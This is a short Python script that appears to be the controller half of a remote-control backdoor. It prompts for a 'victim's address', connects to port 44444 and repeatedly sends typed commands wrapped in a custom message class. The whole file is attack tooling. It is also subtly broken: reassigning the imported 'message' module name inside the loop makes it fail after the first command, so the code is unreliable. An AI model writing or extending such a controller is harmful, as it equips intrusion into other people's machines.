import socket, message
BUFFER = 1024
HOST = "0.0.0.0"
PORT = 44444

if __name__ == "__main__":
    HOST = input("victim's address: ")
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    while True:
        message = message.Message(input("> ").strip())
        if message == "":
            continue
        client.send(message.Encode().encode("utf-8"))